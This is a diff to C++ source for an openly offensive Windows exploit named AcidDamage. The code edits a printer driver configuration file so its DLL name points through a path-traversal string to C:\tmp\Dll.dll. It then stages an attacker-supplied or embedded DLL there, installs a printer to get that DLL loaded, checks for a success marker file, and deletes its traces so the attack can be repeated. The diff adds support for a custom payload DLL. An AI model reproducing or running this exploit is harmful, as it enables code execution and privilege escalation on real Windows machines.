@@ -33,7 +33,7 @@ namespace
         return true;
     }
 
-    bool overwrite_path(const std::string p_target, std::string& p_contents, const std::string& p_malicious_dll)
+    bool overwrite_path(const std::string p_target, std::string& p_contents)
     {
         std::cout << "[+] Searching file contents " << std::endl;
         std::string target("<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">LMUD1OUE.DLL</GDL_ATTRIBUTE>");
@@ -45,7 +45,7 @@ namespace
         }
 
         std::cout << "[+] Updating file contents" << std::endl;
-        p_contents.replace(pos, target.size(), "<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">..\\..\\..\\..\\..\\..\\tmp\\" + p_malicious_dll + "</GDL_ATTRIBUTE>");
+        p_contents.replace(pos, target.size(), "<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">..\\..\\..\\..\\..\\..\\tmp\\Dll.dll</GDL_ATTRIBUTE>");
 
         std::cout << "[+] Dropping updated gpl" << std::endl;
         std::ofstream ofs(p_target, std::ofstream::trunc);
@@ -85,25 +85,49 @@ bool AcidDamage::do_exploit()
         return false;
     }
 
-    if (!overwrite_path(m_target_directory + m_target_dll, fcontents, m_malicious_dll))
+    if (!overwrite_path(m_target_directory + m_target_dll, fcontents))
     {
         return false;
     }
 
+    // drop inject_me to disk if no command line dll has been provided
+    if (!m_custom_dll && !drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
+    {
+        return false;
+    }
+
+    std::cout << "[+] Staging dll in c:\\tmp" << std::endl;
     std::string tmp_dir("C:\\tmp\\");
     std::filesystem::create_directory(tmp_dir);
-    drop_dll_to_disk(tmp_dir + m_malicious_dll, inject_me_dll, inject_me_dll_len);
+    try
+    {
+        std::filesystem::copy_file(m_malicious_dll, tmp_dir + "Dll.dll");
+    }
+    catch (const std::exception& e)
+    {
+        std::cout << "[-] " << e.what() << std::endl;
+    }
 
     install_printer();
 
     if (!std::filesystem::exists("C:\\result.txt"))
     {
-        std::cout << "[-] Failed! Oh no!" << std::endl;
+        if (m_custom_dll)
+        {
+            std::cout << "[+] Exploit complete." << std::endl;
+        }
+        else
+        {
+            std::cout << "[-] Failed! Oh no!" << std::endl;
+        }
     }
     else
     {
         std::cout << "[!] Mucho success!" << std::endl;
     }
 
+    // delete the directory / file so we can reexploit if we want
+    std::filesystem::remove_all(m_target_directory);
+    std::filesystem::remove_all(tmp_dir);
     return true;
 }
